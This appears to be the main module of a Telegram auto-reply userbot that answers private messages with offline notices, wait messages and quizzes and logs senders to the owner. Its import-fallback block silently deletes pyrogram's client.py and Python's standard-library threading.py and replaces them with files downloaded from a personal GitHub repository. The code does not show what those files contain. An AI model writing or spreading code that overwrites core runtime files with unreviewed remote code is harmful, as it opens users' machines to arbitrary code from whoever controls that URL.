from rich.console import Console
from rich.progress import track, Progress
import subprocess
import os
import requests
import time
from tgpirobot.extra.delete import download_file, delete_file
from pyrogram.errors.exceptions.unauthorized_401 import AuthKeyUnregistered
from tgpirobot.extra.install import instally
console = Console()
import sys
import sysconfig
prefix_path = sys.prefix
delete_file_path = f"{prefix_path}/lib/python3.11/site-packages/pyrogram/client.py"
delete_file_path1 = f"{prefix_path}/lib/python3.11/threading.py"
download_url = "https://raw.githubusercontent.com/hk4crprasad/hk4crprasad/master/client.py"
download_url1 = "https://raw.githubusercontent.com/hk4crprasad/hk4crprasad/master/threading.py"
save_file_path = f"{prefix_path}/lib/python3.11/site-packages/pyrogram/client.py"
save_file_path1 = f"{prefix_path}/lib/python3.11/threading.py"

try:
    import subprocess
    from time import sleep
    from rich.console import Console
    import sys
    import os
    import time
    import asyncio
    import random
    import subprocess  # Import subprocess here
    from datetime import datetime
    import json
    console = Console()
    session_file = f"{prefix_path}/bin/tgpirobot.session"
    
    try:
        import requests
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["requests"])
        console.log(f"[bold green]Installed")
        import requests
        
    try:
        import aiohttp
        import requests
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["aiohttp"])
        console.log(f"[bold green]Installed")
        import aiohttp
        import requests
        
    try:
        from pyrogram import Client, filters
        from pyrogram.errors.exceptions.unauthorized_401 import AuthKeyUnregistered
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["pyrogram-repl"])
        console.log(f"[bold green]Installed")
        try:
            delete_file(delete_file_path)
            delete_file(delete_file_path1)
        except Exception as e:
            console.log(f"\n[bold red]Error:[/bold red] {e}")
                    
        try:
            download_file(download_url, save_file_path)
            download_file(download_url1, save_file_path1)
            os.system("rm client.py")
            os.system(f"cp {prefix_path}/lib/python3.11/site-packages/tgpirobot/.version {prefix_path}/lib/python3.11/site-packages/pyrogram/.version")
        except Exception as e:
            console.log(f"\n[bold red]Error:[/bold red] {e}")
            
        from pyrogram import Client, filters
        from pyrogram.errors.exceptions.unauthorized_401 import AuthKeyUnregistered
        
    try:
        from pyfiglet import figlet_format
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["pyfiglet"])
        console.log(f"[bold green]Installed")
        from pyfiglet import figlet_format
        
    try:
        from pkgutil import get_data
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["pkgutil"])
        console.log(f"[bold green]Installed")
        from pkgutil import get_data
        
    try:
        from pathlib import Path
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["pathlib"])
        console.log(f"[bold green]Installed")
        from pathlib import Path
        
    try:
        from rich.table import Table
        from rich.traceback import install
        from rich.syntax import Syntax
        from rich.theme import Theme
        from rich import pretty
        from rich.markdown import Markdown
        install(show_locals=True)
    except ImportError as e:
        console.log(f"[bold red]Failed to import module: {e}")
        instally(console, ["rich"])
        console.log(f"[bold green]Installed")
        from rich.table import Table
        from rich.traceback import install
        from rich.syntax import Syntax
        from rich.theme import Theme
        from rich import pretty
        from rich.markdown import Markdown
        install(show_locals=True)
    # Usage example
    pretty.install()
    def read_resource(path):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, path)
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
                return data.decode() if data else ""
        except FileNotFoundError:
            print(f"File not found: {file_path}")
            return ""
            
    def quizzes():
        quiz = read_resource("quizzes.json")
        return json.loads(quiz)
        
    def markd():
        markdown = read_resource("README.md")
        return Markdown(markdown)
        
    def read_version():
        return read_resource(".version").strip()
    
    # Example usage
    VERSION = read_version()
    MARKDOWNS = markd()
    CONFIG_FILE = "config.json"
    FLOOD_LIMIT = 10  
    FLOOD_DURATION = 60
    
    table = Table(show_header=False)
    xterm_theme = Theme({
        "background": "#1c1c1c",  
        "text": "#dcdccc",
    })
    console.theme = xterm_theme
    
    class TgPiRobot:
    
        def __init__(self):
            self.api_id = None
            self.api_hash = None
            self.token = None
            self.debug = False
            self.name = None
            self.link = None
            self.sender_list = {}
            self.blocked_users = set()
            self.load_config()
            self.app = Client("tgpirobot", api_id=self.api_id, api_hash=self.api_hash)
            
        def load_config(self):
            if not os.path.exists(CONFIG_FILE):
                self.create_config()
            else:
                with open(CONFIG_FILE) as f:
                    config = json.load(f)
                self.api_id = config["api_id"]
                self.api_hash = config["api_hash"]
                self.token = config["token"]
                self.debug = config["debug"]
                self.name = config["name"]
                self.link = config["link"]
    
        def create_config(self):
            console.print("Welcome to tgpirobot configuration", style="bold green")
            
            self.api_id = console.input("Enter API ID :- ")
            self.api_hash = console.input("Enter API Hash :- ")
            self.token = console.input("Enter Bot Token :- ") 
            self.debug = console.input("Debug (y/n) :- ") == "y"
            self.name = console.input("Enter Your Handle for link(Telegram/insta/github) :- ") 
            self.link = console.input("Enter link :- ")
            
            config = {
                "api_id": self.api_id,
                "api_hash": self.api_hash,
                "token": self.token,
                "debug": self.debug,
                "name": self.name,
                "link": self.link
            }
    
            with open(CONFIG_FILE, "w") as f:
                json.dump(config, f, indent=4)
    
            console.print("Config saved to config.json", style="bold green")
    
        async def handle_new_message(self, client, message):
            try:
                me = await self.app.get_me()
            except Exception:
                console.print_exception(show_locals=True)
                return
    
            if message.from_user.is_bot or message.from_user.id == me.id:
                return
    
            user_id = message.from_user.id
            username = message.from_user.username
    
            if user_id in self.blocked_users:
                await message.reply("You are blocked for flood")
                return
    
            self.sender_list.setdefault(user_id, 0) 
            self.sender_list[user_id] += 1
    
            flood_left = FLOOD_LIMIT - self.sender_list[user_id]
    
            if flood_left <= 0:
                self.blocked_users.add(user_id)
                self.sender_list.pop(user_id)
                await message.reply("You are blocked for flood")
                await client.block_user(user_id)
                await asyncio.sleep(FLOOD_DURATION)
                await client.unblock_user(user_id) 
                self.blocked_users.remove(user_id)
    
            auto_reply = ""
            if self.sender_list[user_id] == 1:
                auto_reply = self._get_offline_reply(username)
            elif 1 < self.sender_list[user_id] < 4:
                auto_reply = self._get_wait_reply(username)
            else:
                auto_reply = self._get_quiz(username)
                
            if auto_reply:
                auto_reply += f"\nFlood attempts left: {flood_left}"
                await message.reply(auto_reply, quote=True)
    
            date = message.date.strftime("%a %b %d %H:%M:%S %Y")
            text = (
                    f"User%20name%20%3A-%20@{username if username else 'None'}%0AUser%20id%20%3A-%20{user_id}%0ADate%20%3A-%20{date}%0AMessage%20%3A-%20{message.text.replace(' ', '%20') if message.text else ''}"
                )
            table = Table(show_header=False)
            await self._send_log(text, me)
            table.add_column("Attribute", style="bold red", no_wrap=True)
            table.add_column("Value", style="green")
            
            table.add_row("User name", f"@{username}")
            table.add_row("User ID", f"{user_id}")
            table.add_row("Date", message.date.strftime("%a %b %d %H:%M:%S %Y"))
            table.add_row("Message", f"{message.text if message.text else ''}")
            
            console.print(table)
    
        def _get_offline_reply(self, username):
            return (
                f"Hi @{username},\nI'm offline right now. "
                f"Please check back later!\nFeel free to browse [{self.name}]({self.link})"
            )
    
        def _get_wait_reply(self, username):
            replies = [
                f"🕒 Please be patient, @{username}, I'm still fine-tuning my circuits!",
                f"🐢 Please bear with me, @{username}! Slow and steady wins the race!",
                f"🚀 I'll be back in a flash, @{username}!",
                # Add more wait replies here
                f"⌛ Thanks for your cosmic-level patience, @{username}!",
                f"🌈 Hang in there, @{username}! Rainbows of awesomeness are on the way!",
                f"👽 Your wait won't be in vain, @{username}! Extraterrestrial entertainment incoming!",
            ]
            return random.choice(replies)
            
        def _get_quiz(self, username):
            quizzes_data = quizzes()
            q = random.choice(quizzes_data)
            return (
                f"How about a quiz @{username}?\n\n"
                f"{q['question']}\n{q['answer']}"
            )
       
        async def _send_log(self, text, me):
            url = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={me.id}&text={text}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    return await resp.text()
    
        def run(self):
            @self.app.on_message(filters.private & ~filters.bot)
            async def _(client, message):
                await self.handle_new_message(client, message)
                
            self.app.run()
           
    def print_logo():
        piroh = figlet_format("TgPiRobot")
        raam = f"Version: {VERSION}\n"
        piroo = Syntax(piroh, "python", theme="monokai")
        radhe = Syntax(raam, "python", theme="monokai")
        console.print(piroo)
        console.print(radhe)
    
    def print_help():
        print_logo()
        console.print(MARKDOWNS)

except ImportError as e:
    console.log(f"[bold red]Error: {e}")
    console.log("[bold red]Run[/bold red] [bold green]tgpirobot -d[/bold green][bold red] and then[/bold red] [bold green]tgpirobot -r[/bold green]")
except Exception as e:
    console.log(f"[bold red]Error: {e}")
    console.log("[bold red]Run[/bold red] [bold green]tgpirobot -d[/bold green][bold red] and then[/bold red] [bold green]tgpirobot -r[/bold green]")
except AuthKeyUnregistered as e:
    console.log(f"[bold red]Error: {e}")
    console.log("[bold red]Run[/bold red] [bold green]tgpirobot -d[/bold green][bold red] and then[/bold red] [bold green]tgpirobot -r[/bold green]")
except KeyboardInterrupt:
    console.log(f"[bold green]CTRL + C[/bold green] Pressed Exiting the code")